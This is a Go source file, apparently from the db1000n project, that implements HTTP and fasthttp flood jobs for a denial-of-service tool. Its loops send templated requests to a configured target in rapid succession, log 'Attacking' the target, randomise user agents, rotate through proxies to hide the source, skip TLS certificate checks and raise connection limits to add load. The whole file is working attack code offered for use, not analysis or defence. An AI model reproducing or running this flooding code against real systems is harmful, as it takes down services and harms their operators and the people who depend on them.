package jobs

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"text/template"
	"time"

	"github.com/corpix/uarand"
	"github.com/google/uuid"
	"github.com/valyala/fasthttp"
	"github.com/valyala/fasthttp/fasthttpproxy"

	"github.com/Arriven/db1000n/src/metrics"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/templates"
)

func httpJob(ctx context.Context, args Args, debug bool) error {
	defer utils.PanicHandler()

	var jobConfig struct {
		BasicJobConfig

		Path    string
		Method  string
		Body    json.RawMessage
		Headers map[string]string
		Client  json.RawMessage // See HTTPClientConfig
	}
	if err := json.Unmarshal(args, &jobConfig); err != nil {
		log.Printf("Error parsing job config json: %v", err)
		return err
	}

	client := newHTTPClient(jobConfig.Client, debug)

	methodTpl, pathTpl, bodyTpl, headerTpls, err := parseHTTPRequestTemplates(
		jobConfig.Method, jobConfig.Path, string(jobConfig.Body), jobConfig.Headers)
	if err != nil {
		return err
	}

	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for jobConfig.Next(ctx) {
		method, path, body := templates.Execute(methodTpl, nil), templates.Execute(pathTpl, nil), templates.Execute(bodyTpl, nil)
		dataSize := len(method) + len(path) + len(body) // Rough uploaded data size for reporting

		req, err := http.NewRequest(method, path, bytes.NewReader([]byte(body)))
		if err != nil {
			metrics.IncHTTP(jobConfig.Path, jobConfig.Method, metrics.StatusFail)
			if debug {
				log.Printf("Error creating request: %v", err)
			}

			continue
		}

		select {
		case <-ticker.C:
			log.Printf("Attacking %v", jobConfig.Path)
		default:
		}

		// Add random user agent and configured headers
		req.Header.Set("user-agent", uarand.GetRandom())
		for keyTpl, valueTpl := range headerTpls {
			key, value := templates.Execute(keyTpl, nil), templates.Execute(valueTpl, nil)
			req.Header.Add(key, value)
			dataSize += len(key) + len(value)
		}

		sendRequest(client, req, debug)

		trafficMonitor.Add(dataSize)

		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
	}

	return nil
}

func newHTTPClient(clientCfg json.RawMessage, debug bool) (client *http.Client) {
	var clientConfig struct {
		TLSClientConfig *tls.Config    `json:"tls_config,omitempty"`
		Timeout         *time.Duration `json:"timeout"`
		MaxIdleConns    *int           `json:"max_idle_connections"`
		ProxyURLs       string         `json:"proxy_urls"`
	}

	if err := json.Unmarshal([]byte(templates.ParseAndExecute(string(clientCfg), nil)), &clientConfig); err != nil && debug {
		log.Printf("Failed to parse job client json, ignoring: %v", err)
	}

	timeout := 90 * time.Second
	if clientConfig.Timeout != nil {
		timeout = *clientConfig.Timeout
	}

	maxIdleConns := 1000
	if clientConfig.MaxIdleConns != nil {
		maxIdleConns = *clientConfig.MaxIdleConns
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}
	if clientConfig.TLSClientConfig != nil {
		tlsConfig = clientConfig.TLSClientConfig
	}

	var proxy func(r *http.Request) (*url.URL, error)
	if len(clientConfig.ProxyURLs) > 0 {
		log.Printf("clientConfig.ProxyURLs: %v", clientConfig.ProxyURLs)

		var proxyURLs []string

		if err := json.Unmarshal([]byte(clientConfig.ProxyURLs), &proxyURLs); err == nil {
			if debug {
				log.Printf("proxyURLs: %v", proxyURLs)
			}

			// Return random proxy from the list
			proxy = func(r *http.Request) (*url.URL, error) {
				if len(proxyURLs) == 0 {
					return nil, errors.New("proxylist is empty")
				}

				proxyString := proxyURLs[rand.Intn(len(proxyURLs))]

				u, err := url.Parse(proxyString)
				if err != nil {
					if u, err = url.Parse(r.URL.Scheme + proxyString); err != nil && debug {
						log.Printf("Failed to parse proxy, sending request directly: %v", err)
					}
				}

				return u, nil
			}
		} else if debug {
			log.Printf("Failed to parse proxies: %v", err) // It will still send traffic as if no proxies were specified, no need for warning
		}
	}

	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
			Dial: (&net.Dialer{
				Timeout:   timeout,
				KeepAlive: timeout,
			}).Dial,
			MaxIdleConns:          maxIdleConns,
			IdleConnTimeout:       timeout,
			TLSHandshakeTimeout:   timeout,
			ExpectContinueTimeout: timeout,
			Proxy:                 proxy,
		},
		Timeout: timeout,
	}
}

func sendRequest(client *http.Client, req *http.Request, debug bool) {
	if debug {
		log.Printf("%s %s started at %d", req.Method, req.RequestURI, time.Now().Unix())
	}

	resp, err := client.Do(req)
	if err != nil {
		metrics.IncHTTP(req.Host, req.Method, metrics.StatusFail)
		if debug {
			log.Printf("Error sending request %v: %v", req, err)
		}

		return
	}
	metrics.IncHTTP(req.Host, req.Method, metrics.StatusSuccess)

	resp.Body.Close() // No need for response

	if debug {
		if resp.StatusCode >= http.StatusBadRequest {
			log.Printf("%s %s failed at %d with code %d", req.Method, req.RequestURI, time.Now().Unix(), resp.StatusCode)
		} else {
			log.Printf("%s %s finished at %d", req.Method, req.RequestURI, time.Now().Unix())
		}
	}
}

func parseHTTPRequestTemplates(method, path, body string, headers map[string]string) (
	methodTpl, pathTpl, bodyTpl *template.Template, headerTpls map[*template.Template]*template.Template, err error) {
	if methodTpl, err = templates.Parse(method); err != nil {
		return nil, nil, nil, nil, fmt.Errorf("error parsing method template: %v", err)
	}

	if pathTpl, err = templates.Parse(path); err != nil {
		return nil, nil, nil, nil, fmt.Errorf("error parsing path template: %v", err)
	}

	if bodyTpl, err = templates.Parse(body); err != nil {
		return nil, nil, nil, nil, fmt.Errorf("error parsing body template: %v", err)
	}

	headerTpls = make(map[*template.Template]*template.Template, len(headers))
	for key, value := range headers {
		keyTpl, err := templates.Parse(key)
		if err != nil {
			return nil, nil, nil, nil, fmt.Errorf("error parsing header key template %q: %v", key, err)
		}

		valueTpl, err := templates.Parse(value)
		if err != nil {
			return nil, nil, nil, nil, fmt.Errorf("error parsing header value template %q: %v", value, err)
		}

		headerTpls[keyTpl] = valueTpl
	}

	return methodTpl, pathTpl, bodyTpl, headerTpls, nil
}

func fasthttpJob(ctx context.Context, args Args, debug bool) error {
	defer utils.PanicHandler()

	var jobConfig struct {
		BasicJobConfig

		Path    string
		Method  string
		Body    json.RawMessage
		Headers map[string]string
		Client  json.RawMessage // See HTTPClientConfig
	}
	if err := json.Unmarshal(args, &jobConfig); err != nil {
		log.Printf("Error parsing job config json: %v", err)
		return err
	}

	client := newFastHTTPClient(jobConfig.Client, debug)

	methodTpl, pathTpl, bodyTpl, headerTpls, err := parseHTTPRequestTemplates(
		jobConfig.Method, jobConfig.Path, string(jobConfig.Body), jobConfig.Headers)
	if err != nil {
		return err
	}

	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	for jobConfig.Next(ctx) {
		method, path, body := templates.Execute(methodTpl, nil), templates.Execute(pathTpl, nil), templates.Execute(bodyTpl, nil)
		dataSize := len(method) + len(path) + len(body) // Rough uploaded data size for reporting

		select {
		case <-ticker.C:
			log.Printf("Attacking %v", jobConfig.Path)
		default:
		}

		req.SetRequestURI(path)
		req.Header.SetMethod(method)
		req.SetBodyString(body)
		// Add random user agent and configured headers
		req.Header.Set("user-agent", uarand.GetRandom())
		for keyTpl, valueTpl := range headerTpls {
			key, value := templates.Execute(keyTpl, nil), templates.Execute(valueTpl, nil)
			req.Header.Set(key, value)
			dataSize += len(key) + len(value)
		}
		sendFastHTTPRequest(client, req, debug)

		trafficMonitor.Add(dataSize)

		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
	}

	return nil
}

func newFastHTTPClient(clientCfg json.RawMessage, debug bool) (client *fasthttp.Client) {
	var clientConfig struct {
		TLSClientConfig *tls.Config    `json:"tls_config,omitempty"`
		Timeout         *time.Duration `json:"timeout"`
		ReadTimeout     *time.Duration `json:"read_timeout"`
		WriteTimeout    *time.Duration `json:"write_timeout"`
		IdleTimeout     *time.Duration `json:"idle_timeout"`
		MaxIdleConns    *int           `json:"max_idle_connections"`
		ProxyURLs       string         `json:"proxy_urls"`
	}

	if err := json.Unmarshal([]byte(templates.ParseAndExecute(string(clientCfg), nil)), &clientConfig); err != nil && debug {
		log.Printf("Failed to parse job client json, ignoring: %v", err)
	}

	timeout := 90 * time.Second
	if clientConfig.Timeout != nil {
		timeout = *clientConfig.Timeout
	}

	readTimeout := timeout
	if clientConfig.ReadTimeout != nil {
		readTimeout = *clientConfig.ReadTimeout
	}

	writeTimeout := timeout
	if clientConfig.WriteTimeout != nil {
		writeTimeout = *clientConfig.WriteTimeout
	}

	idleTimeout := timeout
	if clientConfig.IdleTimeout != nil {
		idleTimeout = *clientConfig.IdleTimeout
	}

	maxIdleConns := 1000
	if clientConfig.MaxIdleConns != nil {
		maxIdleConns = *clientConfig.MaxIdleConns
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}
	if clientConfig.TLSClientConfig != nil {
		tlsConfig = clientConfig.TLSClientConfig
	}

	var proxy = func() string { return "" }
	if len(clientConfig.ProxyURLs) > 0 {
		log.Printf("clientConfig.ProxyURLs: %v", clientConfig.ProxyURLs)

		var proxyURLs []string

		if err := json.Unmarshal([]byte(clientConfig.ProxyURLs), &proxyURLs); err == nil {
			if debug {
				log.Printf("proxyURLs: %v", proxyURLs)
			}

			// Return random proxy from the list
			proxy = func() string {
				if len(proxyURLs) == 0 {
					return ""
				}

				proxyString := proxyURLs[rand.Intn(len(proxyURLs))]

				u, err := url.Parse(proxyString)
				if err != nil {
					return ""
				}

				return u.String()
			}
		} else if debug {
			log.Printf("Failed to parse proxies: %v", err) // It will still send traffic as if no proxies were specified, no need for warning
		}
	}
	_ = proxy

	return &fasthttp.Client{
		ReadTimeout:                   readTimeout,
		WriteTimeout:                  writeTimeout,
		MaxConnDuration:               timeout,
		MaxIdleConnDuration:           idleTimeout,
		MaxConnsPerHost:               maxIdleConns,
		NoDefaultUserAgentHeader:      true, // Don't send: User-Agent: fasthttp
		DisableHeaderNamesNormalizing: true, // If you set the case on your headers correctly you can enable this
		DisablePathNormalizing:        true,
		TLSConfig:                     tlsConfig,
		// increase DNS cache time to an hour instead of default minute
		Dial: fasthttpProxyDial(proxy, timeout, (&fasthttp.TCPDialer{
			Concurrency:      4096,
			DNSCacheDuration: time.Hour,
		}).Dial),
	}
}

func fasthttpProxyDial(proxyFunc func() string, timeout time.Duration, backup fasthttp.DialFunc) fasthttp.DialFunc {
	return func(addr string) (net.Conn, error) {
		proxy := proxyFunc()
		if proxy == "" {
			return backup(addr)
		} else {
			return fasthttpproxy.FasthttpHTTPDialerTimeout(proxy, timeout)(addr)
		}
	}
}

func sendFastHTTPRequest(client *fasthttp.Client, req *fasthttp.Request, debug bool) {
	if debug {
		log.Printf("%s %s started at %d", string(req.Header.Method()), string(req.RequestURI()), time.Now().Unix())
	}

	err := client.Do(req, nil)
	if err != nil {
		metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusFail)
		if debug {
			log.Printf("Error sending request %v: %v", req, err)
		}

		return
	}
	metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusSuccess)
}
